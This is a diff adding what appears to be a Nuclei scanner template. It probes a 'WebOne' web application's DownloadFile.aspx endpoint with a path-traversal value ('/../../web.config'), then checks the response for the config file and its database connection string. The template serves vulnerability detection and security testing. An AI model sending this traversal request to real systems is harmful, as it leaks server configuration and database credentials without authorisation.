@@ -1,0 +1,21 @@
+id: WebOne-DownloadFile-readfile
+info:
+  name: WebOne-DownloadFile-readfile
+  author: gui
+  severity: high
+http:
+  - raw:
+      - |-
+        GET /webForms/Download/DownloadFile.aspx?fileid=/../../web.config&flag=report HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - <configSections>
+          - WeboneConnectionString
+    matchers-condition: and
